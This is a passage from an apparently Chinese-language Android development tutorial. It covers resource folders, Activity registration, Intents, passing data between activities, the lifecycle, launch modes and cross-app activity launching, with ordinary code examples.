<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dimen</span> <span class="attr">name</span>=<span class="string">&quot;view_length&quot;</span>&gt;</span>100dp<span class="tag">&lt;/<span class="name">dimen</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="res-values-array-xml">res/values/array.xml<a class="header-anchor" href="#res-values-array-xml"> ¶ </a></h5>
<p>Array资源可以分为三类：</p>
<ul>
<li>string-array：字符串组成的数组形式。</li>
<li>integer-array：int型数据组成的数组形式。</li>
<li>array：一般数组形式（数据元素类型不限）。</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string-array</span> <span class="attr">name</span>=<span class="string">&quot;user_name&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">item</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">item</span>&gt;</span>李四<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">string-array</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">integer-array</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">item</span>&gt;</span>18<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">item</span>&gt;</span>20<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">integer-array</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">array</span> <span class="attr">name</span>=<span class="string">&quot;pic&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">item</span>&gt;</span>@drawable/user1<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">item</span>&gt;</span>@drawable/user2<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>java代码中使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Resources res = getResources();</span><br><span class="line">String[] userName = res.getStringArray(R.array.user_name);</span><br><span class="line"><span class="keyword">int</span>[] age = res.getIntArray(R.array.age);</span><br><span class="line">TypedArray userPic = res.obtainTypedArray(R.array.pic);</span><br><span class="line"><span class="comment">//对于TypedArray类型，需要先获得其TypedArray对象，然后再从该对象中依次获得指定下标的元素。</span></span><br><span class="line"></span><br><span class="line">Drawable firstPic = userPic.getDrawable(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<h5 id="res-values-style">res/values/style<a class="header-anchor" href="#res-values-style"> ¶ </a></h5>
<p>Style资源可以设置layout视图组件中某一个视图元素的样式；该资源文件位于res/values目录下，文件名自定义</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">&quot;CustomText&quot;</span>&gt;</span><span class="xml"></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">item</span> <span class="attr">name</span>=<span class="string">&quot;android:textSize&quot;</span>&gt;</span>20sp<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">item</span> <span class="attr">name</span>=<span class="string">&quot;android:textColor&quot;</span>&gt;</span>#FF4081<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span></span><br><span class="line"><span class="xml">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>&lt;style&gt;</code>元素中parent属性表明该样式继承的父级元素样式。</p>
<p>在布局控件中使用该style</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">TextView</span> <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">&quot;Hello World!&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">style</span>=<span class="string">&quot;@style/CustomText&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="res-values-theme">res/values/theme<a class="header-anchor" href="#res-values-theme"> ¶ </a></h5>
<p>Theme资源可以设置Activity窗口的样式；该资源文件位于res/values/目录下，文件名自定义。</p>
<ul>
<li>Theme资源对某个Activity或整个Application起作用，而不是单独的视图组件。</li>
<li>Theme主题主要用来设置应用窗口的特征信息（如窗口标题、窗口背景、窗口边框等）。</li>
</ul>
<p>Theme资源的使用需要从两个角度考虑：</p>
<ul>
<li>在res/values/目录中定义主题资源文件。</li>
<li>在AndroidManifest.xml文件或Activity中为整个Activity或整个Application应用主题</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">&quot;CustomTheme&quot;</span> <span class="attr">parent</span>=<span class="string">&quot;AppTheme&quot;</span>&gt;</span><span class="xml"></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">item</span> <span class="attr">name</span>=<span class="string">&quot;windowNoTitle&quot;</span>&gt;</span>true<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">item</span> <span class="attr">name</span>=<span class="string">&quot;android:colorBackground&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">                     @color/custom_theme_color<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span></span><br><span class="line"><span class="xml">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>为应用程序应用主题：</p>
<ul>
<li>在AndroidManifest.xml文件静态绑定：
<ul>
<li>可以为<code>&lt;application&gt;</code>元素添加 <code>android:theme</code>属性，属性值即为用户刚才所设计的theme资源（<code>@style/CustomTheme</code> )。</li>
<li>可以为<code>&lt;activity&gt;</code>元素添加 <code>android:theme</code>属性，属性值即为用户刚才所设计的theme资源（<code>@style/CustomTheme</code> )。</li>
</ul>
</li>
<li>在Activity文件中动态绑定主题：
<ul>
<li>使用Activity类的<code>setTheme( R.style.CustomTheme )</code>方法。</li>
<li>该方法必须在<code>setContentView( )</code>方法或<code>getLayoutInflate( ).inflate( )</code>方法之前被调用。</li>
</ul>
</li>
</ul>
<h5 id="res-mipmap">res/mipmap/<a class="header-anchor" href="#res-mipmap"> ¶ </a></h5>
<p>在res/目录下默认情况有六个mipmap子目录。</p>
<ul>
<li>res/mipmap-anydpi-v26 ： API26及以上使用自适应图标</li>
<li>res/mipmap-mdpi： 中分辨率图标</li>
<li>res/mipmap-hdpi、mipmap-xhdpi、mipmap-xxhdpi、mipmap-xxxhdpi： 高分辨率图标</li>
</ul>
<p>这六个子目录中的图片名可以完全相同，Android应用会根据用户设备分辨率的不同而自行选择。</p>
<h5 id="res-drawable">res/drawable/<a class="header-anchor" href="#res-drawable"> ¶ </a></h5>
<table>
<thead>
<tr>
<th><strong>类型</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Bitmap File</td>
<td>图片文件资源</td>
</tr>
<tr>
<td>9-patch  File</td>
<td>基于适应内容而自动伸缩的图片（扩展名是  .9.png）</td>
</tr>
<tr>
<td>Layer  List</td>
<td>一个XML文件，管理一系列图片资源的特殊资源</td>
</tr>
<tr>
<td>State  List</td>
<td>一个XML文件，针对视图控件不同状态而设置的特殊drawable类型</td>
</tr>
<tr>
<td>Level  List</td>
<td>一个XML文件，根据视图控件不同等级而现实不同的drawable资源</td>
</tr>
<tr>
<td>Shape  Drawable</td>
<td>一个XML文件，定义包含颜色和渐变的几何图形</td>
</tr>
<tr>
<td>Scale  Drawable</td>
<td>一个XML文件，根据当前对准值作相应的平铺处理</td>
</tr>
<tr>
<td>Transition Drawable</td>
<td>一个XML文件，用两张图片形成一个渐变效果的drawable资源</td>
</tr>
</tbody>
</table>
<h5 id="res-xml">res/xml/<a class="header-anchor" href="#res-xml"> ¶ </a></h5>
<p>在res/xml/目录下的XML文件为任意规范的XML文档，这些文档没有其它附加意义，仅仅是存储数据或展示数据。</p>
<p>这些XML文档，不能在其它XML资源中引用。</p>
<p>在Activity中，可以使用Resources对象的getXML()方法，加载到内置的XML解析器中，以方便处理。</p>
<p>该类资源的一个典型应用是：存储应用中使用到的配置信息。</p>
<h5 id="res-raw">res/raw/<a class="header-anchor" href="#res-raw"> ¶ </a></h5>
<p>res/raw/目录存储任意原始格式的文件（可能为.txt、.mp3、.flv等等）。</p>
<p>该目录下的文件，一般不能使用在其它XML资源中。</p>
<p>该目录中的文件，同样会被R类所索引；因此在Activity中可以使用<code>R.raw.***</code>方式引用资源；通过Resources对象的<code>openRawResource()</code>方法，可以获得原始对象的输入流，以方便后续使用。</p>
<h3 id="Assets目录">Assets目录<a class="header-anchor" href="#Assets目录"> ¶ </a></h3>
<p>assets目录：无法直接访问的原生资源（只能通过AssetManager来处理）。</p>
<p>Android Studio创建的项目中，默认不包含assets目录，需要手动创建。在<code>res</code>同级目录创建<code>assets</code>目录</p>
<ul>
<li>assets目录中可以建立子目录，建立更灵活的目录结构。</li>
<li>assets目录中的文件格式是任意的，不一定必须是XML文件。</li>
<li>assets/目录下文件不会被R类索引，即assets/目录下资源不能使用Resources对象获取。</li>
<li>assets/目录下资源不会被打包到APK中，即assets目录中适合存放过大的文件。</li>
<li>assets目录下的资源不会被R类处理，因此不能使用res目录下资源的访问方式来访问。</li>
<li>在Java代码中，一般是通过getAssets( )方法获得AssetManager对象，然后再加载指定资源，处理该资源。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AssetManager assetManager = getAssets();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    InputStream is = assetManager.open(<span class="string">&quot;test.txt&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在Android中使用assets目录下资源：</p>
<ul>
<li>
<p>AssetManager对象中的常用方法：</p>
<table>
<thead>
<tr>
<th><strong>方法名</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>String[] list(String path)</td>
<td>返回path目录下所有文件组成的字符串数组形式（若path为空，则表示assets目录）</td>
</tr>
<tr>
<td>InputStream open(String filename)</td>
<td>打开指定fileName表示的文件流，返回该输入流</td>
</tr>
<tr>
<td>XmlResourceParser  openXmlResourceParser(String filename)</td>
<td>从assets目录下的fileName文件中加载XML解析器</td>
</tr>
<tr>
<td>void close()</td>
<td>关闭当前AssetManager对象</td>
</tr>
</tbody>
</table>
</li>
</ul>
<h2 id="Activity活动">Activity活动<a class="header-anchor" href="#Activity活动"> ¶ </a></h2>
<h3 id="活动基本用法">活动基本用法<a class="header-anchor" href="#活动基本用法"> ¶ </a></h3>
<h4 id="注册活动">注册活动<a class="header-anchor" href="#注册活动"> ¶ </a></h4>
<p>需要在<code>AndroidManifest.xml</code>中的<code>application</code>节点中注册<code>activity</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.FirstActivity&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>若为主Activity</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.FirstActivity&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:label</span>=<span class="string">&quot;This is FirstActivity&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="销毁活动">销毁活动<a class="header-anchor" href="#销毁活动"> ¶ </a></h4>
<p>调用<code>finish()</code>方法</p>
<h3 id="使用Intent">使用Intent<a class="header-anchor" href="#使用Intent"> ¶ </a></h3>
<h4 id="显式Intent">显式Intent<a class="header-anchor" href="#显式Intent"> ¶ </a></h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent(FirstActivity.<span class="keyword">this</span>, SecondActivity.class);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h4 id="隐式Intent">隐式Intent<a class="header-anchor" href="#隐式Intent"> ¶ </a></h4>
<p>在<code>&lt;action&gt;</code> 标签中我们指明了当前活动可以响应某个action ，而<code>&lt;category&gt;</code> 标签则包含了一些附加信息，更精确地指明了当前的活动能够响应的Intent中还可能带有的category 。只有<code>&lt;action&gt;</code> 和<code>&lt;category&gt;</code> 中的内容同时能够匹配上Intent中指定的<code>action</code> 和<code>category</code> 时，这个活动才能响应该<code>Intent</code>。</p>
<p>可以新建<code>Intent</code>时，直接将<code>action</code>字符串传进去</p>
<p>每个Intent中只能指定一个<code>action</code> ，但却能指定多个<code>category</code> 。</p>
<p>可以使用<code>Intent.addCategory(String category)</code>来指定category，如果没有符合的activity，app就会报错</p>
<p>在<code>&lt;intent-filter&gt;</code>标签中再配置一个<code>&lt;data&gt;</code> 标签，用于更精确地指定当前活动能够响应什么类型的数据。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用系统浏览器打开百度</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">    Intent intent = <span class="keyword">new</span> Intent(Intent.ACTION_VIEW);</span><br><span class="line">    intent.setData(Uri.parse(<span class="string">&quot;http://www.baidu.com&quot;</span>));</span><br><span class="line">    startActivity(intent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们还可以在<code>&lt;intent-filter&gt;</code> 标签中再配置一个<code>&lt;data&gt;</code> 标签，用于更精确地指定当前活动能够响应什么类型的数据。<code>&lt;data&gt;</code> 标签中主要可以配置以下属性。</p>
<ul>
<li><code>android:scheme</code> 。用于指定数据的协议部分，如上例中的<code>http</code>部分。</li>
<li><code>android:host</code> 。用于指定数据的主机名部分，如上例中的<code>www.baidu.com</code>部分。</li>
<li><code>android:port</code> 。用于指定数据的端口部分，一般紧随在主机名之后。</li>
<li><code>android:path</code> 。用于指定主机名和端口之后的部分，如一段网址中跟在域名之后的内容。</li>
<li><code>android:mimeType</code> 。用于指定可以处理的数据类型，允许使用通配符的方式进行指定。</li>
</ul>
<p>只有<code>&lt;data&gt;</code> 标签中指定的内容和Intent中携带的Data完全一致时，当前活动才能够响应该Intent。</p>
<h4 id="向下一个活动传递数据">向下一个活动传递数据<a class="header-anchor" href="#向下一个活动传递数据"> ¶ </a></h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        String data = <span class="string">&quot;Hello SecondActivity&quot;</span>;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent(FirstActivity.<span class="keyword">this</span>, SecondActivity.class);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;extra_data&quot;</span>, data);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SecondActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line"></span><br><span class="line">        setContentView(R.layout.second_layout);</span><br><span class="line">        Intent intent = getIntent();</span><br><span class="line">        String data = intent.getStringExtra(<span class="string">&quot;extra_data&quot;</span>);</span><br><span class="line">        Log.d(<span class="string">&quot;SecondActivity&quot;</span>, data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="返回数据给上一个活动">返回数据给上一个活动<a class="header-anchor" href="#返回数据给上一个活动"> ¶ </a></h4>
<p>启动新activity</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent(FirstActivity.<span class="keyword">this</span>, SecondActivity.class);</span><br><span class="line">        startActivityForResult(intent, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>新activity返回数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">    Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">    intent.putExtra(<span class="string">&quot;data_return&quot;</span>, <span class="string">&quot;Hello FirstActivity&quot;</span>);</span><br><span class="line">    setResult(RESULT_OK, intent);</span><br><span class="line">    finish();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>旧activity接收数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onActivityResult</span><span class="params">(<span class="keyword">int</span> requestCode, <span class="keyword">int</span> resultCode, Intent data)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (requestCode) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> (resultCode == RESULT_OK) &#123;</span><br><span class="line">                String returnedData = data.getStringExtra(<span class="string">&quot;data_return&quot;</span>);</span><br><span class="line">                Log.d(<span class="string">&quot;FirstActivity&quot;</span>, returnedData);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>onActivityResult()方法带有三个参数，第一个参数requestCode ，即我们在启动活动时传入的请求码。第二个参数resultCode ，即我们在返回数据时传入的处理结果。第三个参数data ，即携带着返回数据的Intent。由于在一个活动中有可能调用startActivityForResult() 方法去启动很多不同的活动，每一个活动返回的数据都会回调到onActivityResult()这个方法中，因此我们首先要做的就是通过检查requestCode 的值来判断数据来源。确定数据是从SecondActivity返回的之后，我们再通过resultCode 的值来判断处理结果是否成功。最后从data 中取值并打印出来，这样就完成了向上一个活动返回数据的工作。</p>
<p>一般通过重写<code>onBackPressed()</code>方法来返回数据和结束activity</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onBackPressed</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">    intent.putExtra(<span class="string">&quot;data_return&quot;</span>, <span class="string">&quot;Hello FirstActivity&quot;</span>);</span><br><span class="line">    setResult(RESULT_OK, intent);</span><br><span class="line">    finish();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Activity生命周期">Activity生命周期<a class="header-anchor" href="#Activity生命周期"> ¶ </a></h3>
<h4 id="返回栈">返回栈<a class="header-anchor" href="#返回栈"> ¶ </a></h4>
<p>Android中的活动是可以层叠的。我们每启动一个新的活动，就会覆盖在原活动之上，然后点击Back键会销毁最上面的活动，下面的一个活动就会重新显示出来。</p>
<p>Android是使用任务（Task）来管理活动的，一个任务就是一组存放在栈里的活动的集合，这个栈也被称作返回栈（Back Stack）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//%E8%BF%94%E5%9B%9E%E6%A0%88.png" alt="返回栈"></p>
<h4 id="活动状态">活动状态<a class="header-anchor" href="#活动状态"> ¶ </a></h4>
<ol>
<li>
<p>运行状态</p>
<p>当一个活动位于返回栈的<strong>栈顶</strong>时，这时活动就处于运行状态。系统最不愿意回收的就是处于运行状态的活动，因为这会带来非常差的用户体验。</p>
</li>
<li>
<p>暂停状态</p>
<p>当一个活动<strong>不再处于栈顶位置，但仍然可见</strong>时，这时活动就进入了暂停状态。你可能会觉得既然活动已经不在栈顶了，还怎么会可见呢？这是因为并不是每一个活动都会占满整个屏幕的，比如对话框形式的活动只会占用屏幕中间的部分区域，你很快就会在后面看到这种活动。处于暂停状态的活动仍然是完全存活着的，系统也不愿意去回收这种活动（因为它还是可见的，回收可见的东西都会在用户体验方面有不好的影响），只有在内存极低的情况下，系统才会去考虑回收这种活动。</p>
</li>
<li>
<p>停止状态</p>
<p>当一个活动<strong>不再处于栈顶位置，并且完全不可见</strong>的时候，就进入了停止状态。系统<strong>仍然会为这种活动保存相应的状态和成员变量，但是这并不是完全可靠的，当其他地方需要内存时，处于停止状态的活动有可能会被系统回收。</strong></p>
</li>
<li>
<p>销毁状态</p>
<p>当一个活动从返回栈中移除后就变成了销毁状态。系统会最倾向于回收处于这种状态的活动，从而保证手机的内存充足。</p>
</li>
</ol>
<h4 id="活动的生命周期">活动的生命周期<a class="header-anchor" href="#活动的生命周期"> ¶ </a></h4>
<ol>
<li><code>onCreate()</code>:这个方法你已经看到过很多次了，每个活动中我们都重写了这个方法，它会在活动第一次被创建的时候调用。你应该在这个方法中完成活动的初始化操作，比如说加载布局、绑定事件等。</li>
<li><code>onStart()</code>:这个方法在活动由不可见变为可见的时候调用。</li>
<li><code>onResume()</code>:这个方法在活动准备好和用户进行交互的时候调用。此时的活动一定位于返回栈的栈顶，并且处于运行状态。</li>
<li><code>onPause()</code>:这个方法在系统准备去启动或者恢复另一个活动的时候调用。我们通常会在这个方法中将一些消耗CPU的资源释放掉，以及保存一些关键数据，但这个方法的执行速度一定要快，不然会影响到新的栈顶活动的使用。</li>
<li><code>onStop()</code>:这个方法在活动完全不可见的时候调用。它和<code>onPause()</code> 方法的主要区别在于，如果启动的新活动是一个对话框式的活动，那么<code>onPause()</code> 方法会得到执行，而<code>onStop()</code> 方法并不会执行。</li>
<li><code>onDestroy()</code>:这个方法在活动被销毁之前调用，之后活动的状态将变为销毁状态。</li>
<li><code>onRestart()</code>:这个方法在活动由停止状态变为运行状态之前调用，也就是活动被重新启动了。<br>
活动的完整周期：</li>
</ol>
<p>活动的初始化，比如布局、绑定事件：onCreate() -&gt; 活动的转为可见：onStart() -&gt; 活动转为可以与用户进行交互：onResume() -&gt; 活动转为不可见并释放相关资源：onPause() -&gt; 活动释放资源：onStop() -&gt; 活动销毁：onDestory()</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//activity%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png" alt="activity生命周期"></p>
<h4 id="活动被回收了怎么办">活动被回收了怎么办<a class="header-anchor" href="#活动被回收了怎么办"> ¶ </a></h4>
<p>onSaveInstanceState() 方法会携带一个Bundle</p>
<p>保存</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onSaveInstanceState</span><span class="params">(Bundle outState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onSaveInstanceState(outState);</span><br><span class="line">    String tempData = <span class="string">&quot;Something you just typed&quot;</span>;</span><br><span class="line">    outState.putString(<span class="string">&quot;data_key&quot;</span>, tempData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>恢复</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    Log.d(TAG, <span class="string">&quot;onCreate&quot;</span>);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    <span class="keyword">if</span> (savedInstanceState != <span class="keyword">null</span>) &#123;</span><br><span class="line">        String tempData = savedInstanceState.getString(<span class="string">&quot;data_key&quot;</span>);</span><br><span class="line">        Log.d(TAG, tempData);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="活动的启动模式">活动的启动模式<a class="header-anchor" href="#活动的启动模式"> ¶ </a></h3>
<p>在<code>&lt;activity&gt;</code>节点中指定属性 <code>android:launchMode=&quot;&quot;</code></p>
<ul>
<li>
<p>standard：默认启动模式</p>
<p><strong>standard是活动默认的启动模式</strong>，在不进行显式指定的情况下，所有活动都会自动使用这种启动模式。因此，到目前为止我们写过的所有活动都是使用的standard模式。经过上一节的学习，你已经知道了Android是使用返回栈来管理活动的，</p>
<p>在standard模式（即默认情况）下，每当启动一个新的活动，它就会在返回栈中入栈，并处于栈顶的位置。对于使用standard模式的活动，系统不会在乎这个活动是否已经在返回栈中存在，每次启动都会创建该活动的一个新的实例。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//standard.png" alt="standard"></p>
</li>
<li>
<p>singleTop：顶部不重复</p>
<p>使用singleTop模式。当活动的启动模式指定为singleTop，在启动活动时如果发现返回栈的栈顶已经是该活动，则认为可以直接使用它，不会再创建新的活动实例。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//singleTop.png" alt="singleTop"></p>
</li>
<li>
<p>singleTask：任务栈中不重复</p>
<p>当活动的启动模式指定为singleTask，每次启动该活动时系统首先会在返回栈中检查是否存在该活动的实例，如果发现已经存在则直接使用该实例，<strong>并把在这个活动之上的所有活动统统出栈，如果没有发现就会创建一个新的活动实例。</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//singleTask.png" alt="singleTask"></p>
</li>
<li>
<p>singleInstance：单独任务栈</p>
<p>在这种模式下会有一个单独的返回栈来管理这个活动，不管是哪个应用程序来访问这个活动，都共用的同一个返回栈</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//singleInstance.png" alt="singleInstance"></p>
</li>
</ul>
<h4 id="跨应用启动Activity">跨应用启动Activity<a class="header-anchor" href="#跨应用启动Activity"> ¶ </a></h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">ComponentName comName = <span class="keyword">new</span> ComponentName([PackageName],[PackageName/ActivityName]);</span><br><span class="line">intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line">intent.setComponent(comName);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>
